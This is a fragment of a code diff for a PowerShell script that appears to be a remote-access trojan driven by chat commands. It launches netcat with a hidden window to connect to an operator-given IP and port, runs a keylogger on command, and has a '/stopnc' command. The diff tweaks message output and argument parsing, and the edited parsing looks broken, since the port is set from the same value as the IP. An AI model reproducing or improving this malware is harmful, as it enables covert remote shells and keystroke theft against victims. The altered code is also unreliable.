@@ -535,8 +535,8 @@ function netcat($ip, $port) {
 
     Start-Sleep -Seconds 5
     Send-Message "Connecting.."
-    Send-Message "IP:$ip"
-    Send-Message "Port:$port"
+    Send-Message "IP: $ip"
+    Send-Message "Port: $port"
     Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
 }
 
@@ -733,8 +733,8 @@ While ($DoNotExit)  {
         keylogger seconds $time
       }
       "/nc $ipV4 *"{
-        $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
-	$port = $LastMessageText -replace "/nc $ipV4 ",""
+        $ip = ($LastMessageText -split "/nc $ipV4 ")[1]
+        $port = $ip -replace '\s*$', ''
         netcat $ip $port
       }
       "/stopnc $ipV4"{
